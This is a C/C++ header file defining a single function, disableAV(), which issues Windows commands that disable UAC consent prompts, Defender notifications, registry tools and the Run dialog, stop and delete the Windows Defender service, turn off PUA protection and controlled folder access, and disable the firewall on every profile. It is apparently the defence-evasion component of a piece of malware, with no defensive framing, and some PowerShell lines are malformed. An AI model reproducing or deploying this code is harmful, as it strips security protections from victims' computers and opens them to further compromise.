#pragma once
#include <Windows.h>

void disableAV() {
	system("reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\\"  /v \"ConsentPromptBehaviorAdmin\" /t REG_DWORD /d \"0\" /f");
	system("reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\UX Configuration\"  /v \"Notification_Suppress\" /t REG_DWORD /d \"1\" /f");
	system("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v \"DisableRegistryTools\" /t REG_DWORD /d \"1\" /f");
	system("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v \"NoRun\" /t REG_DWORD /d \"1\" /f");
	system("sc stop  windefend");
	system("sc delete windefend");
	system("Set - MpPreference - PUAProtection disable");
	system("Set-MpPreference -EnableControlledFolderAccess Disabled");
	system("netsh advfirewall set allprofiles state off");
}